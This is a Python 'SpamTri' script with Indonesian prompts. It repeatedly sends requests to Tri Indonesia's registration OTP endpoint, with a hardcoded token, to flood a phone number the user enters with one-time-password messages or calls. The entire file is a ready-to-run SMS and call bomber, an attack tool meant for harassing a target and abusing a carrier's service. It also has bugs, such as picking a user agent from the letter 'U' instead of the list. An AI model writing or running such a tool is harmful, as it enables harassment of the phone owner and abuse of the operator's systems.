#!/usr/bin/python
# coding: utf-8
from time import sleep
import os, requests, random
U=['Mozilla/5.0 (Linux; Android 8.1.0; U6 PRIME) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16',
'Mozilla/5.1 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko',
'Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
'Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]',
'Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70;]',
'Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36']

def Sms(J):
	token=requests.get('https://registrasi.tri.co.id/daftar/generateOTP?').text
	r=requests.post('https://registrasi.tri.co.id/daftar/generateOTP',data={'token':'76qse2LgWJKoZdfWYZfzPYqs969cRD1Z','msisdn':No, 'accept':'call'},headers={'User-Agent': random.choice('U'),'Accept-Encoding':'gzip, deflate','Accept':'*/*', 'Connection':'keep-alive','Content-Length':'60','Content-Type': 'application/x-www-form-urlencoded'}).json()
	try:print('[%s] Spam => %s'%(J,r['status']))
	except:exit(r)
	sleep(3)
print('=============================')
os.system("'date'|lolcat")
print('=============================')
os.system('figlet -f bubble "SpamTri"|lolcat')
print('=============================')
print('==[ Acak Acak Vino Copian ]==')
print('=============================')
print('==[ Awali Nomer Dengan 62 ]==')
print('=============================')
No=input('[?] No Three : ')
Ju=input('[?] Max Send : ')
print('=============================')
try:
	for J in range(1,int(Ju)+1):
		Sms(J)
except(ImportError):
	exit()
except requests.exceptions.ConnectionError:
	print('[!] Cek Connection')
	sleep(3)
print('=============================')